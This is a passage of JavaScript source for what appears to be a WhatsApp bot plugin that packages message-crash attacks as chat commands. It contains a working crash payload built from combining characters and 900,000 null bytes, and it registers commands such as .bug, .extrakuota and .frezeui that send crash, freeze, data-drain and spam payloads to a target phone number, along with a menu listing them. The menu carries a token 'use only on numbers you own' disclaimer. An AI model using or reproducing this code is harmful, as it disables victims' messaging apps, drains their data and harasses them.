                                            { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "DIEE!!!", title: "CRASH!", id: ".crasher" }) }
                                        ]
                                    }
                                }],
                                messageVersion: 1
                            }
                        }
                    }
                }
            }
        }
    }, { participant: { jid: target }, messageParamsJson: "})".repeat(10000) });
}
async function CrashMemek(conn, target) {
    await conn.relayMessage(target, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: { title: "VnF", locationMessage: {}, hasMediaAttachment: true },
                    body: { text: "`ꦻ⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝ោ࣯࣯៝" + "\0".repeat(900000) },
                    nativeFlowMessage: { messageParamsJson: "\0" },
                    carouselMessage: {}
                }
            }
        }
    }, { participant: { jid: target } });
}

// ==================== COMMANDS ====================

cmd({ pattern: "bug", desc: "💀 ULTRA CRASH (100 mixed + 3 killers)", category: "tools", filename: __filename }, async (conn, mek, m, { from, reply, args }) => {
    const target = getTarget(args, from, reply, "bug");
    if (!target) return;
    await reply(`💀 *ULTRA CRASH* → ${target}`);
    await ttaas(conn, target);
    await extremeKillers(conn, target);
    const img = await getImageBuffer("https://whiteshadow-uploader.vercel.app/files/813.jpg");
    if (img) await conn.sendMessage(from, { image: img, caption: `✅ ULTRA CRASH SENT → ${target}\n⚠️ *Black screen / force close*` });
    else await reply(`✅ ULTRA CRASH SENT → ${target}\n⚠️ *Black screen / force close*`);
});

cmd({ pattern: "shavi-invis", desc: "🔮 INVISIBLE CRASH (no text)", category: "tools", filename: __filename }, async (conn, mek, m, { from, reply, args }) => {
    const target = getTarget(args, from, reply, "shavi-invis");
    if (!target) return;
    await reply(`🔮 *INVISIBLE CRASH* → ${target}`);
    await invisibleCrash(conn, target);
    const img = await getImageBuffer("https://whiteshadow-uploader.vercel.app/files/813.jpg");
    if (img) await conn.sendMessage(from, { image: img, caption: `✅ INVISIBLE CRASH SENT → ${target}` });
    else await reply(`✅ INVISIBLE CRASH SENT → ${target}`);
});

cmd({ pattern: "protocol10", desc: "Video spam + mention (100x)", category: "tools", filename: __filename }, async (conn, mek, m, { from, reply, args }) => {
    const target = getTarget(args, from, reply, "protocol10");
    if (!target) return;
    await reply(`📹 *PROTOCOL10* → ${target}`);
    await protocolbug10(conn, target, false);
    await reply(`✅ 100 videos sent`);
});

cmd({ pattern: "paydox", desc: "Multiple payload crash", category: "tools", filename: __filename }, async (conn, mek, m, { from, reply, args }) => {
    const target = getTarget(args, from, reply, "paydox");
    if (!target) return;
    await reply(`💸 *PAYDOX* → ${target}`);
    await paydox(conn, target);
    await reply(`✅ Payloads sent`);
});

cmd({ pattern: "extrakuota", desc: "Kuota drain + sticker spam", category: "tools", filename: __filename }, async (conn, mek, m, { from, reply, args }) => {
    const target = getTarget(args, from, reply, "extrakuota");
    if (!target) return;
    await reply(`📡 *EXTRA KUOTA* → ${target}`);
    await extrakuota(conn, target);
    await reply(`✅ Kuota drain sent`);
});

cmd({ pattern: "invico", desc: "Newsletter admin invite", category: "tools", filename: __filename }, async (conn, mek, m, { from, reply, args }) => {
    const target = getTarget(args, from, reply, "invico");
    if (!target) return;
    await invico1(conn, target);
    await reply(`✅ Invite sent`);
});
cmd({ pattern: "uinew", desc: "Interactive message crash", category: "tools", filename: __filename }, async (conn, mek, m, { from, reply, args }) => {
    const target = getTarget(args, from, reply, "uinew");
    if (!target) return;
    await Uinew(conn, target);
    await reply(`✅ UI new sent`);
});
cmd({ pattern: "uikiller", desc: "Location killer", category: "tools", filename: __filename }, async (conn, mek, m, { from, reply, args }) => {
    const target = getTarget(args, from, reply, "uikiller");
    if (!target) return;
    await uiKiller(conn, target);
    await reply(`✅ UI killer sent`);
});
cmd({ pattern: "frezeui", desc: "Buttons freeze", category: "tools", filename: __filename }, async (conn, mek, m, { from, reply, args }) => {
    const target = getTarget(args, from, reply, "frezeui");
    if (!target) return;
    await frezeui(conn, target);
    await reply(`✅ Freeze UI sent`);
});
cmd({ pattern: "forcexsys", desc: "Force X system", category: "tools", filename: __filename }, async (conn, mek, m, { from, reply, args }) => {
    const target = getTarget(args, from, reply, "forcexsys");
    if (!target) return;
    await ForceXsystem(conn, target);
    await reply(`✅ Force X system sent`);
});
cmd({ pattern: "frezeXblank", desc: "100x interactive spam", category: "tools", filename: __filename }, async (conn, mek, m, { from, reply, args }) => {
    const target = getTarget(args, from, reply, "frezeXblank");
    if (!target) return;
    await reply(`🌀 *FrezeXblank* → ${target} (100 loops)`);
    await FrezeXblank(conn, target);
    await reply(`✅ 100 loops sent`);
});
cmd({ pattern: "blankui", desc: "Blank interactive UI", category: "tools", filename: __filename }, async (conn, mek, m, { from, reply, args }) => {
    const target = getTarget(args, from, reply, "blankui");
    if (!target) return;
    await BlankUi(conn, target);
    await reply(`✅ Blank UI sent`);
});
cmd({ pattern: "uiblank", desc: "List response blank", category: "tools", filename: __filename }, async (conn, mek, m, { from, reply, args }) => {
    const target = getTarget(args, from, reply, "uiblank");
    if (!target) return;
    await uiblank(conn, target);
    await reply(`✅ UI blank sent`);
});
cmd({ pattern: "newslettersql", desc: "Newsletter SQL", category: "tools", filename: __filename }, async (conn, mek, m, { from, reply, args }) => {
    const target = getTarget(args, from, reply, "newslettersql");
    if (!target) return;
    await newsletterSqL(conn, target);
    await reply(`✅ Newsletter SQL sent`);
});
cmd({ pattern: "bak2", desc: "Carousel card crash", category: "tools", filename: __filename }, async (conn, mek, m, { from, reply, args }) => {
    const target = getTarget(args, from, reply, "bak2");
    if (!target) return;
    await bak2(conn, target);
    await reply(`✅ Bak2 sent`);
});
cmd({ pattern: "crashmemek", desc: "Memek crash", category: "tools", filename: __filename }, async (conn, mek, m, { from, reply, args }) => {
    const target = getTarget(args, from, reply, "crashmemek");
    if (!target) return;
    await CrashMemek(conn, target);
    await reply(`✅ Memek crash sent`);
});

// ==================== BUG MENU ====================
cmd({ pattern: "bugmenu", desc: "Show all crash commands", category: "tools", filename: __filename }, async (conn, mek, m, { from, reply }) => {
    const menuText = `*╭─「 👑 Sʜᴀᴠɪʏᴀ Xᴍᴅ Cʀᴀsʜ Mᴇɴᴜ 」─*\n*│ 📌 .bug           : ULTRA CRASH (100 mixed + 3 killers)*\n*│ 📌 .shavi-invis   : Invisible crash*\n*│ 📌 .protocol10    : Video spam (100x)*\n*│ 📌 .paydox        : Multi-payload crash*\n*│ 📌 .extrakuota    : Kuota drain + sticker*\n*│ 📌 .invico        : Newsletter invite*\n*│ 📌 .uinew         : Interactive crash*\n*│ 📌 .uikiller      : Location killer*\n*│ 📌 .frezeui       : Buttons freeze*\n*│ 📌 .forcexsys     : Force X system*\n*│ 📌 .frezeXblank   : 100x interactive spam*\n*│ 📌 .blankui       : Blank interactive UI*\n*│ 📌 .uiblank       : List response blank*\n*│ 📌 .newslettersql : Newsletter SQL*\n*│ 📌 .bak2          : Carousel card crash*\n*│ 📌 .crashmemek    : Memek crash*\n*╰──────────────●●►*\n> 💡 *Usᴀɢᴇ:* .command 947XXXXXXXXX\n> ⚠️ *Exᴛʀᴇᴍᴇ ᴘᴏᴡᴇʀ – ᴜsᴇ ᴏɴʟʏ ᴏɴ ɴᴜᴍʙᴇʀs ʏᴏᴜ ᴏᴡɴ.*`;
    const menuImg = await getImageBuffer("https://whiteshadow-uploader.vercel.app/files/nsa.jpg");
    if (menuImg) await conn.sendMessage(from, { image: menuImg, caption: menuText });
    else await reply(menuText);
});
